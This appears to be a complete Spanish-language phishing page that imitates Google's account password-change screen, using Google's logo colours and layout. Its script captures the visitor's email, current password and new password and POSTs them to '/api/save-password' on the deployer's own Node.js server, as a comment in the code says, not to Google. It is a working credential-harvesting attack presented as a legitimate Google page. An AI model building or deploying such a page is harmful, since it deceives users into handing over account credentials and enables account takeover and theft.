<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cambiar contraseña - Cuenta de Google</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #202124;
        }
        .container {
            width: 400px;
            padding: 40px;
            text-align: left;
        }
        .google-logo {
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .google-logo span span:nth-child(1) { color: #4285F4; }
        .google-logo span span:nth-child(2) { color: #EA4335; }
        .google-logo span span:nth-child(3) { color: #FBBC05; }
        .google-logo span span:nth-child(4) { color: #4285F4; }
        .google-logo span span:nth-child(5) { color: #34A853; }
        .google-logo span span:nth-child(6) { color: #EA4335; }

        h2 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 24px;
            text-align: center;
        }
        h3 {
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        p.subtitle {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        .input-group {
            position: relative;
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .hint {
            font-size: 12px;
            color: #5f6368;
            margin-bottom: 16px;
            margin-top: -10px;
        }
        .buttons-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }
        .btn-omitir {
            background: none;
            border: none;
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            padding: 10px 0;
        }
        .btn-guardar {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-guardar:hover {
            background-color: #1557b0;
        }
        #message {
            margin-top: 15px;
            font-size: 14px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <span>
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </span>
        </div>
        <h2>Cambiar contraseña</h2>

        <h3>Crea una contraseña segura</h3>
        <p class="subtitle">Introduce tu correo, tu contraseña actual y define una contraseña nueva y segura.</p>

        <form id="passwordForm">
            <div class="input-group">
                <input type="email" id="email" required placeholder="Correo electrónico">
            </div>

            <div class="input-group">
                <input type="password" id="oldPassword" required placeholder="Contraseña anterior">
            </div>

            <div class="input-group">
                <input type="password" id="password" required placeholder="Crear contraseña">
            </div>
            <div class="hint">Utiliza al menos ocho caracteres.</div>

            <div class="input-group">
                <input type="password" id="confirmation" required placeholder="Confirmación de contraseña">
            </div>

            <div class="buttons-row">
                <button type="button" class="btn-omitir">Omitir</button>
                <button type="submit" class="btn-guardar">Guardar contraseña</button>
            </div>
        </form>
        <div id="message"></div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', async (e) => {
  e.preventDefault(); // Evita que la página se recargue y se quede trabada

  // Cambia el texto del botón visualmente
  const boton = document.querySelector('button[type="submit"]');
  if (boton) boton.innerText = "Guardando...";

  // Captura los valores de los campos de texto
  const email = document.querySelector('input[type="email"]').value;
  const inputs = document.querySelectorAll('input[type="password"]');
  const oldPassword = inputs[0] ? inputs[0].value : '';
  const password = inputs[1] ? inputs[1].value : '';
  const confirmation = inputs[2] ? inputs[2].value : password;

  try {
    // AQUÍ ESTÁ EL CAMBIO CLAVE: Envía los datos a tu servidor de Node.js
    const respuesta = await fetch('/api/save-password', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ email, oldPassword, password, confirmation })
    });

    const resultado = await respuesta.json();

    if (resultado.success) {
      alert('¡Contraseña actualizada con éxito!');
      location.reload(); // Recarga la página limpia
    } else {
      alert('Error al guardar.');
      if (boton) boton.innerText = "Guardar contraseña";
    }
  } catch (error) {
    console.error('Error de red:', error);
    alert('Ocurrió un error de conexión.');
    if (boton) boton.innerText = "Guardar contraseña";
  }
});
    </script>
</body>
</html>
